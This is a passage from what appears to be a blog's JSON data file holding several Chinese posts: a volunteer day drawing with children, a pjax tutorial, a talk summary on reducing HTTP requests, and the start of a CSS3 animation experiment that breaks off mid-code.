</p>\n<blockquote>\n<p>晓凡：哥哥你几年级？<br>我：我已经上班了。<br>晓凡：不会吧？看不出来哎。你在哪里上班？<br>我：腾讯。<br>晓凡：原来是挺随便找了个公司<br>我：……对</p>\n</blockquote>\n<p>水饺是个小胖子，有很多个花名。其中一个叫做豆子，但现在不许我们这么叫他，因为他说自己已经长大了，豆子太小就改名成水饺了。水饺热衷于怪兽图…他的太阳都是有手脚的。他用短短时间画了两张“百兽图”，还会问我：哥哥我要你手机，你有天天酷跑吗，我要画里面有个怪兽。</p>\n<p>馒头是我带的小朋友里面绘画思维最好的一位。她想着画羊，还会借我的手机，自己去搜索图片去模仿。很聪明的小女孩。<br><img src=\"/assets/blogImg/volunteer2.jpg\" alt=\"馒头的画\">                  </p>\n<p>妹妹殊琪却比较胆小，总怕出错，跟姐姐完全不一样。她喜欢让我帮忙出谋划策，却不敢自己大胆去涂画，直到最后她还没敢涂色。</p>\n<p>晓平比晓凡小5岁，是个扎着双马尾很可爱的小朋友，有需要也会主动问我，但从不要求我插手，只凭自己感觉去画画，这点超赞。</p>\n<p>雅典娜小朋友的作品是在场很少的，能传达出意义的画作。看不出是个二年级学生的作品。聪慧美丽的小女孩人如其名。<br><img src=\"/assets/blogImg/volunteer3.jpg\" alt=\"雅典娜的画\">                  </p>\n<p>讲解印象派水彩的时候，老师问，谁能看出这幅画与前面的画的区别。我脑中尽是高深详细的“印象派”词义描述，有不确定的点，再拿出手机百度一翻，最后成竹在胸，了然于心。</p>\n<blockquote>\n<p>后面一小朋友大声喊：看不清！<br>老师：对的，这就是印象派的特征。</p>\n</blockquote>\n<p>有时我们顾于去搜寻最客观的解释，企图用权威的释义去描述事务，却不能像小朋友一样，忠实于自己的眼睛。也许，他们真的比我们懂更多所谓的“印象派”，不是么？</p>\n","source":"_posts/volunteer-activities.markdown","raw":"---\nlayout: post\ntitle: \"小朋友，跟你谈谈印象派\"\ndate: 2014-03-30 23:52\ncomments: true\ntags: \n\t- 生活 \n\t- 随笔\nbrief: \"副标题：记一件难忘的事\"\n---       \n\n今天去陪留守的小朋友一起画画，这是一个义工志愿者活动。\n\n经游戏分组，我负责带5位小朋友，正巧是三胞胎和双胞胎。                     \n杜晓凡、杜晓平、杜德俊（水饺）三兄妹，文殊琪、文殊曼（馒头）姐妹。混淆了好几次谁是馒头，谁是水饺后，我已经记住你们的名字了。                         \n![5位小朋友](/assets/blogImg/volunteer1.jpg)                  \n<!-- more -->\n小朋友们都不认生，晓凡一开始就问我好多问题。比如这些：        \n> 晓凡：哥哥你几年级？        \n> 我：我已经上班了。         \n> 晓凡：不会吧？看不出来哎。你在哪里上班？            \n> 我：腾讯。            \n> 晓凡：原来是挺随便找了个公司               \n> 我：……对\n\n水饺是个小胖子，有很多个花名。其中一个叫做豆子，但现在不许我们这么叫他，因为他说自己已经长大了，豆子太小就改名成水饺了。水饺热衷于怪兽图…他的太阳都是有手脚的。他用短短时间画了两张“百兽图”，还会问我：哥哥我要你手机，你有天天酷跑吗，我要画里面有个怪兽。\n\n馒头是我带的小朋友里面绘画思维最好的一位。她想着画羊，还会借我的手机，自己去搜索图片去模仿。很聪明的小女孩。                     \n![馒头的画](/assets/blogImg/volunteer2.jpg)                  \n\n妹妹殊琪却比较胆小，总怕出错，跟姐姐完全不一样。她喜欢让我帮忙出谋划策，却不敢自己大胆去涂画，直到最后她还没敢涂色。\n\n晓平比晓凡小5岁，是个扎着双马尾很可爱的小朋友，有需要也会主动问我，但从不要求我插手，只凭自己感觉去画画，这点超赞。\n\n雅典娜小朋友的作品是在场很少的，能传达出意义的画作。看不出是个二年级学生的作品。聪慧美丽的小女孩人如其名。                       \n![雅典娜的画](/assets/blogImg/volunteer3.jpg)                  \n\n讲解印象派水彩的时候，老师问，谁能看出这幅画与前面的画的区别。我脑中尽是高深详细的“印象派”词义描述，有不确定的点，再拿出手机百度一翻，最后成竹在胸，了然于心。\n\n> 后面一小朋友大声喊：看不清！             \n> 老师：对的，这就是印象派的特征。\n\n有时我们顾于去搜寻最客观的解释，企图用权威的释义去描述事务，却不能像小朋友一样，忠实于自己的眼睛。也许，他们真的比我们懂更多所谓的“印象派”，不是么？","slug":"volunteer-activities","updated":1409364827000,"excerpt":"<p>今天去陪留守的小朋友一起画画，这是一个义工志愿者活动。</p>\n<p>经游戏分组，我负责带5位小朋友，正巧是三胞胎和双胞胎。<br>杜晓凡、杜晓平、杜德俊（水饺）三兄妹，文殊琪、文殊曼（馒头）姐妹。混淆了好几次谁是馒头，谁是水饺后，我已经记住你们的名字了。<br><img src=\"/assets/blogImg/volunteer1.jpg\" alt=\"5位小朋友\"><br>","_id":"j77ksqcn8bx85qdv","categories":[],"photos":[],"link":""},{"layout":"post","title":"pjax: 当ajax遇上pushState","date":1392166500000,"comments":true,"tags":["w6w1sbbrofyval78","panvos05q85sf6qq"],"content":"<blockquote>\n<p>var pjax = pushState + ajax;<br>小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片…          </p>\n</blockquote>\n<a id=\"more\"></a>\n\n<h2 id=\"一、简介\"><strong>一、简介</strong></h2>\n<p>pushState是html5中提供的方法，用以</p>\n<ul>\n<li>无刷新的更新浏览器地址栏；            </li>\n<li>如其名称，将新地址push到历史堆栈中            </li>\n</ul>\n<p>用法：<code>pushState(data, title ,url)</code>            </p>\n<p>data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。<br>正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。</p>\n<h2 id=\"二、ajax的纠结历史\"><strong>二、ajax的纠结历史</strong></h2>\n<p>一切可以从ajax最擅长的事情说起。<br>ajax作为一个异步请求模型，从最初设计开始，也许压根就没打算将它跟浏览器历史挂钩。原因是历史堆栈所记录的，某种意思上可以说是顺序，跟我们理解的“同步”更为密切。</p>\n<p>因而，<code>ajax可以无刷新改变页面内容，却无法改变页面的url</code>。</p>\n<ul>\n<li><h4 id=\"历史问题1_-_如何操控历史\">历史问题1 - 如何操控历史</h4>\n</li>\n</ul>\n<p>当单页面越来越流行，操作记录却很容易被忽略。假设有这样的单页面，按照分类点击，界面逐层递进：<code>体育 - 篮球 -nba -马刺队 - 邓肯</code><br>当我们点了4下到“邓肯”界面时，一个不小心的刷新，出现在你面前的也许是“体育”。原因是操作记录没有被记录。<br>而通常的解决方案是修改hash，每递进一层，去更新url的hash值，这样的方法：</p>\n<ol>\n<li>刷新时预先判断url的hash，从而知道这是哪一层，加载相应数据；          </li>\n<li>支持了历史</li>\n</ol>\n<p>这样的方式貌似比较完善，其实不然。</p>\n<ul>\n<li><h4 id=\"历史问题2_-_对搜索引擎不友好\">历史问题2 - 对搜索引擎不友好</h4>\n</li>\n</ul>\n<p>最大的问题是，hash后生成的内容是不会被搜索引擎引用到。数据不能被爬取，无疑是浪费和损失。因此google放言，咱可以约定个协议：<code>#!xxx</code>这样hash的url，google也去爬取。称之为<code>hash bang</code>（哈希大爆炸？）。这一协议，在g+，twitter，人人，新浪微博上都可以看到。</p>\n<p>事实上，ajax最或缺的两个问题，恰好被pushState的功能补充完善。</p>\n<h2 id=\"三、pjax带来的价值\"><strong>三、pjax带来的价值</strong></h2>\n<p>除去补齐了ajax的问题，我们发现pjax会给web带来更多的好处。<br>回到开始说的“两包方便面”，我的意思是，有时你访问两个url，部分数据是相同的。比如百度贴吧，第一页和第二页的区别只是帖子内容（卡片）的不同，网站外框部分（方便面）都是一样的，这些东西就不需要在页面刷新时重复加载。</p>\n<p>ajax处理这样的局部刷新，已经给我们带来了web2.0的体验，而加上pushstate的ajax则更进一步：</p>\n<ol>\n<li>一个url对应一套数据，有利于SEO；</li>\n<li>更改数据和url时，只是局部刷新，带来较好的用户体验；</li>\n<li>兼容性好，对不支持pushstate的浏览器，url也能正常请求页面（虽然有重复加载）；</li>\n<li>刷新页面时，由于是url唯一，能正常加载到用户希望看到的数据，比处理hash的方式更方便；</li>\n<li>后退与前进的浏览器操作，依然可以局部刷新（通过onpushstate事件捕获）</li>\n</ol>\n<h2 id=\"四、注意事项\"><strong>四、注意事项</strong></h2>\n<p>然而pjax不等于单纯的分离使用pushstate与ajax，还必须得做一些封装。缘于以下我能想到的注意事项：</p>\n<ul>\n<li>服务器端增加额外处理逻辑<br>服务器端，需要根据请求的参数，作出全页渲染或局部渲染响应</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Accept:<span class=\"keyword\">text</span>/html, */*; q=<span class=\"number\">0.01</span></div><div class=\"line\">Accept-Encoding:gzip,deflate,sdch</div><div class=\"line\">Connection:keep-alive</div><div class=\"line\">Host:qianduannotes.duapp.com</div><div class=\"line\">User-Agent:AppleWebKit/<span class=\"number\">537.36</span> (KHTML, <span class=\"keyword\">like</span> Gecko) Chrome/<span class=\"number\">31.0</span><span class=\"number\">.1650</span><span class=\"number\">.63</span> Safari/<span class=\"number\">537.36</span></div><div class=\"line\">X-Requested-<span class=\"keyword\">With</span>:XMLHttpRequest</div><div class=\"line\">X-PJAX:<span class=\"literal\">true</span></div></pre></td></tr></table></figure>\n\n<p>比如请求头部可以设定一个X-PAJX:true，用以通知服务器。</p>\n<ul>\n<li>浏览器兼容<br>假如浏览器不支持pushstate，提供fallback操作，直接打开需更改url的地址：</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">$.support.pjax = <span class=\"built_in\">window</span>.history && <span class=\"built_in\">window</span>.history.pushState</div><div class=\"line\"><span class=\"comment\">// Fallback</span></div><div class=\"line\"><span class=\"keyword\">if</span> ( !$.support.pjax ) {</div><div class=\"line\">  $.pjax = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">( options )</span> </span>{</div><div class=\"line\">    <span class=\"built_in\">window</span>.location = $.isFunction(options.url) ? options.url() : options.url</div><div class=\"line\">  }</div><div class=\"line\">  $.fn.pjax = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>{ <span class=\"keyword\">return</span> <span class=\"keyword\">this</span> }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<ul>\n<li>本地存储机制<br>无疑pjax与localstorage共同使用可以进一步提升体验，但这一步容易忽略的是数据上报。</li>\n</ul>\n<h2 id=\"五、参考资料\"><strong>五、参考资料</strong></h2>\n<p><a href=\"https://github.com/defunkt/jquery-pjax\" target=\"_blank\" rel=\"external\">jquery-pjax</a><br><a href=\"https://github.com/welefen/pjax\" target=\"_blank\" rel=\"external\">welefen封装的pjax</a></p>\n","source":"_posts/about-pjax.markdown","raw":"---\nlayout: post\ntitle: \"pjax: 当ajax遇上pushState\"\ndate: 2014-02-12 08:55\ncomments: true\ntags: \n\t- js \n\t- html5\n---       \n\n>var pjax = pushState + ajax;                  \n>小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片…          \n\n<!-- more -->\n\n##**一、简介**\npushState是html5中提供的方法，用以\n\n- 无刷新的更新浏览器地址栏；            \n- 如其名称，将新地址push到历史堆栈中            \n\n用法：`pushState(data, title ,url)`            \n\ndata为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。            \n正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。\n\n##**二、ajax的纠结历史**\n一切可以从ajax最擅长的事情说起。\najax作为一个异步请求模型，从最初设计开始，也许压根就没打算将它跟浏览器历史挂钩。原因是历史堆栈所记录的，某种意思上可以说是顺序，跟我们理解的“同步”更为密切。\n\n因而，`ajax可以无刷新改变页面内容，却无法改变页面的url`。\n\n- ####历史问题1 - 如何操控历史\n\n当单页面越来越流行，操作记录却很容易被忽略。假设有这样的单页面，按照分类点击，界面逐层递进：`体育 - 篮球 -nba -马刺队 - 邓肯`                       \n当我们点了4下到“邓肯”界面时，一个不小心的刷新，出现在你面前的也许是“体育”。原因是操作记录没有被记录。                  \n而通常的解决方案是修改hash，每递进一层，去更新url的hash值，这样的方法：\n\n1. 刷新时预先判断url的hash，从而知道这是哪一层，加载相应数据；          \n2. 支持了历史\n\n这样的方式貌似比较完善，其实不然。\n\n- ####历史问题2 - 对搜索引擎不友好\n\n最大的问题是，hash后生成的内容是不会被搜索引擎引用到。数据不能被爬取，无疑是浪费和损失。因此google放言，咱可以约定个协议：`#!xxx`这样hash的url，google也去爬取。称之为`hash bang`（哈希大爆炸？）。这一协议，在g+，twitter，人人，新浪微博上都可以看到。\n\n事实上，ajax最或缺的两个问题，恰好被pushState的功能补充完善。\n\n##**三、pjax带来的价值**\n除去补齐了ajax的问题，我们发现pjax会给web带来更多的好处。                     \n回到开始说的“两包方便面”，我的意思是，有时你访问两个url，部分数据是相同的。比如百度贴吧，第一页和第二页的区别只是帖子内容（卡片）的不同，网站外框部分（方便面）都是一样的，这些东西就不需要在页面刷新时重复加载。\n\najax处理这样的局部刷新，已经给我们带来了web2.0的体验，而加上pushstate的ajax则更进一步：\n\n1. 一个url对应一套数据，有利于SEO；\n2. 更改数据和url时，只是局部刷新，带来较好的用户体验；\n3. 兼容性好，对不支持pushstate的浏览器，url也能正常请求页面（虽然有重复加载）；\n4. 刷新页面时，由于是url唯一，能正常加载到用户希望看到的数据，比处理hash的方式更方便；\n5. 后退与前进的浏览器操作，依然可以局部刷新（通过onpushstate事件捕获）\n\n##**四、注意事项**\n\n然而pjax不等于单纯的分离使用pushstate与ajax，还必须得做一些封装。缘于以下我能想到的注意事项：\n\n- 服务器端增加额外处理逻辑             \n服务器端，需要根据请求的参数，作出全页渲染或局部渲染响应\n``` \nAccept:text/html, */*; q=0.01\nAccept-Encoding:gzip,deflate,sdch\nConnection:keep-alive\nHost:qianduannotes.duapp.com\nUser-Agent:AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36\nX-Requested-With:XMLHttpRequest\nX-PJAX:true\n```\n比如请求头部可以设定一个X-PAJX:true，用以通知服务器。\n\n- 浏览器兼容\n假如浏览器不支持pushstate，提供fallback操作，直接打开需更改url的地址：\n```\n$.support.pjax = window.history && window.history.pushState\n// Fallback\nif ( !$.support.pjax ) {\n  $.pjax = function( options ) {\n    window.location = $.isFunction(options.url) ? options.url() : options.url\n  }\n  $.fn.pjax = function() { return this }\n}\n```\n- 本地存储机制                  \n无疑pjax与localstorage共同使用可以进一步提升体验，但这一步容易忽略的是数据上报。\n\n##**五、参考资料**\n[jquery-pjax](https://github.com/defunkt/jquery-pjax)                 \n[welefen封装的pjax](https://github.com/welefen/pjax)\n\n\n\n","slug":"about-pjax","updated":1409365233000,"excerpt":"<blockquote>\n<p>var pjax = pushState + ajax;<br>小时候，小浣熊方便面里面有各种水浒人物的卡片。我买了一包，吃了方便面，饱了。而我又买了第二包，不是想吃方便面，而是仅仅想得到里面的卡片…          </p>\n</blockquote>\n","_id":"i1kmt8yuuodtlx8j","categories":[],"photos":[],"link":""},{"layout":"post","title":"再议减少HTTP请求","date":1407993000000,"comments":true,"tags":["panvos05q85sf6qq","b689udghd6s571ss","5qajwfhoj8u1e1sg"],"brief":"第三届IMWEB前端技术沙龙分享","content":"<p><img src=\"/assets/blogImg/reduce-http.jpg\" alt=\"沙龙分享\">       </p>\n<blockquote>\n<p>最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。</p>\n</blockquote>\n<a id=\"more\"></a>\n\n<h3 id=\"前言:\">前言:</h3>\n<p>关于web性能，有两个著名论断：              </p>\n<ol>\n<li><strong>0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力</strong>——Robert Miller                               </li>\n<li><strong>用户所接受的数据，有80~90%的时间都耗在前端上</strong>——Steve Souders</li>\n</ol>\n<p>前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精…</p>\n<p>后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。</p>\n<h3 id=\"再议减少HTTP请求：\">再议减少HTTP请求：</h3>\n<p>“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。</p>\n<p><strong>a. 没有浏览器缓存</strong><br>减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。</p>\n<p><strong>b. 没有cdn缓存</strong><br>这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。</p>\n<p><strong>c. 不能按需加载</strong><br>为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。</p>\n<p><strong>d. 浏览器预解析DNS失效</strong><br>现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。</p>\n<h3 id=\"最佳实践\">最佳实践</h3>\n<p>因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。</p>\n<p><strong>Demo1 必应</strong>               </p>\n<blockquote>\n<ol>\n<li>首次内联CSS与JS<ol>\n<li>将资源取出，并保存在localStorage中</li>\n<li>资源名（版本）保存在cookie中</li>\n<li>后续请求中，服务器检查对应的cookie</li>\n<li>根据cookie的值，只嵌入新的脚本</li>\n<li>加载时，从localStorage里载入资源</li>\n</ol>\n</li>\n</ol>\n</blockquote>\n<p><strong>Demo2 百度(移动端)</strong>               </p>\n<blockquote>\n<ol>\n<li>首次将静态资源打包，用jsonp统一返回<ol>\n<li>将资源解析并保存在localStorage中</li>\n<li>再次访问时检查localStorage中资源情况</li>\n<li>如有缺失再发请求获取资源</li>\n</ol>\n</li>\n</ol>\n</blockquote>\n<p>必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。              </p>\n<p>我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。<br>你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。</p>\n","source":"_posts/reduce-http-requests.markdown","raw":"---\nlayout: post\ntitle: \"再议减少HTTP请求\"\ndate: 2014-08-14 13:10\ncomments: true\ntags: \n\t- html5 \n\t- 前端 \n\t- 性能\nbrief: \"第三届IMWEB前端技术沙龙分享\"\n---       \n\n![沙龙分享](/assets/blogImg/reduce-http.jpg)       \n> 最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。\n\n<!-- more -->\n\n### 前言:\n\n关于web性能，有两个著名论断：              \n1. **0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力**——Robert Miller                               \n2. **用户所接受的数据，有80~90%的时间都耗在前端上**——Steve Souders\n\n前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精…\n\n后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。\n\n### 再议减少HTTP请求：\n\n“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。\n\n**a. 没有浏览器缓存**\n减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。\n\n**b. 没有cdn缓存**\n这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。\n\n**c. 不能按需加载**\n为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。\n\n**d. 浏览器预解析DNS失效**\n现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。\n\n### 最佳实践\n因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。\n\n**Demo1 必应**               \n> 1. 首次内联CSS与JS\n  2. 将资源取出，并保存在localStorage中\n  3. 资源名（版本）保存在cookie中\n  4. 后续请求中，服务器检查对应的cookie\n  5. 根据cookie的值，只嵌入新的脚本\n  6. 加载时，从localStorage里载入资源\n\n**Demo2 百度(移动端)**               \n> 1. 首次将静态资源打包，用jsonp统一返回\n  2. 将资源解析并保存在localStorage中\n  3. 再次访问时检查localStorage中资源情况\n  4. 如有缺失再发请求获取资源\n\n必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。              \n\n我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。                   \n你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。\n\n","slug":"reduce-http-requests","updated":1409484458000,"excerpt":"<p><img src=\"/assets/blogImg/reduce-http.jpg\" alt=\"沙龙分享\">       </p>\n<blockquote>\n<p>最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。</p>\n</blockquote>\n","_id":"rfb6gfaiprq5is9v","categories":[],"photos":[],"link":""},{"layout":"post","title":"当我想用css3实现一个动作类库","date":1356883320000,"comments":true,"tags":["v22smsab7f83ld0m"],"content":"<p>当我如是想的时候，事实上我已想了很久。后来被各种纠结的差事冲乱了生活和心绪，并且心里认为这是个妥当无比的借口。找到了借口后一拖再拖，果然认识到deadline才是第一生产力的真理。最近，却是被朋友的一句话逼急了，他跟我说：我们的业务用到了css4的新属性！</p>\n<p>这句话的意思，大体等同于说，我买到了一个iphone6，亲你怎么看？<br><a id=\"more\"></a><br>它在我脑中纷乱起舞，那是plans vs zombies中一大波僵尸正在逼近的场景。是的，再不行动，就要被技术的狂潮给淹没了！日前，就我的浅薄见闻，当html5越来越多的功能被应用到业务主功能上，诸如本地存储，拖拽优化，postMessage通信…css3却是另一番光景。一方面，一个个绚丽效果的css3-demo在网上被围观与叫好，大家却又在为浏览器兼容性和差异性这座大山望而却步。css3技术在大家眼中更偏向于一种优化的体验，等于说，你不敢用它来实现网站的key point，即使是一个圆角，不问技术细节的产品经理也会想使用图片来代替的。</p>\n<p>因此，缘由可以归结为：我忍够了。要玩，就玩个大的。</p>\n<p>其实虽然我想了很久，但这个“想”，更偏向于单纯的幻想，而不是思考。暑假的时候，在腾讯大讲堂看到有哥们分享css3与js的动画效率比较的演示，就萌生了这个想法。现在，在正式尝试编写类库之前，我想先写2~3个实验demo，来看看技术的复杂度以及一些可以避免的暗礁，并做好一些记录。当然这些demo必须得使用最新的chrome，firefox，opera以及ie8，9才能正常运行。</p>\n<h2 id=\"第一个实验：人物sprite图动画实现，按键与位移的衔接\"><strong>第一个实验：人物sprite图动画实现，按键与位移的衔接</strong></h2>\n<p>请按键盘方向键控制人物运动：</p>\n<iframe id=\"demoIframe\" src=\"/assets/demo/pre_css3_demo/demo.html\" width=\"641\" height=\"483\" scrolling=\"no\"></iframe>\n\n<h2 id=\"最深的体会\"><strong>最深的体会</strong></h2>\n<p><strong>我的js代码需要怎样“辅助”css3？</strong><br>按照我的理解，如果是说一个dom元素的“动作”的话，完全可以用纯css3来实现，而且你可以将dom的动作串连起来。<br>例如：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"at_rule\">@<span class=\"keyword\">-webkit-keyframes</span> q-down </span>{</div><div class=\"line\">     0%<span class=\"rules\">{</span></div><div class=\"line\">          <span class=\"rule\"><span class=\"attribute\">-webkit-transform</span>:<span class=\"value\"><span class=\"function\">rotate</span>(<span class=\"number\">0deg</span>)</span></span>;</div><div class=\"line\">          <span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"><span class=\"number\">10px</span></span></span>;</div><div class=\"line\">     <span class=\"rule\">}</span></div><div class=\"line\">     33%<span class=\"rules\">{</span></div><div class=\"line\">          <span class=\"rule\"><span class=\"attribute\">-webkit-transform</span>:<span class=\"value\"> <span class=\"function\">scale</span>(<span class=\"number\">1.5</span>)</span></span>;</div><div class=\"line\">          <span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"><span class=\"number\">147px</span></span></span>;</div><div class=\"line\">     <span class=\"rule\">}</span></div><div class=\"line\">     66%<span class=\"rules\">{</span></div><div class=\"line\">          <span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"><span class=\"number\">10px</span></span></span>;</div><div class=\"line\">          <span class=\"rule\"><span class=\"attribute\">-webkit-transform</span>:<span class=\"value\"> <span class=\"function\">translate</span>(<span class=\"number\">50px</span>,<span class=\"number\">50px</span>)</span></span>;</div><div class=\"line\">     <span class=\"rule\">}</span></div><div class=\"line\">    100% <span class=\"rules\">{</span></div><div class=\"line\">         <span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"><span class=\"number\">147px</span></span></span>;</div><div class=\"line\">         <span class=\"rule\"><span class=\"attribute\">-webkit-transform</span>:<span class=\"value\"><span class=\"function\">rotate</span>(<span class=\"number\">45deg</span>)</span></span>;</div><div class=\"line\">    <span class=\"rule\">}</span></div><div class=\"line\">}</div><div class=\"line\"><span class=\"class\">.box</span> <span class=\"rules\">{</span></div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">-webkit-animation</span>:<span class=\"value\">q-down  ease</span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">-webkit-animation-duration</span>:<span class=\"value\"> <span class=\"number\">2s</span></span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">-webkit-animation-timing-function</span>:<span class=\"value\"> linear</span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">-webkit-transform</span>:<span class=\"value\"><span class=\"function\">rotate</span>(<span class=\"number\">45deg</span>)</span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">100px</span></span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">100px</span></span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> red</span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\"> absolute</span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">top</span>:<span class=\"value\"> <span class=\"number\">147px</span></span></span>;</div><div class=\"line\">    <span class=\"rule\"><span class=\"attribute\">left</span>:<span class=\"value\"> <span 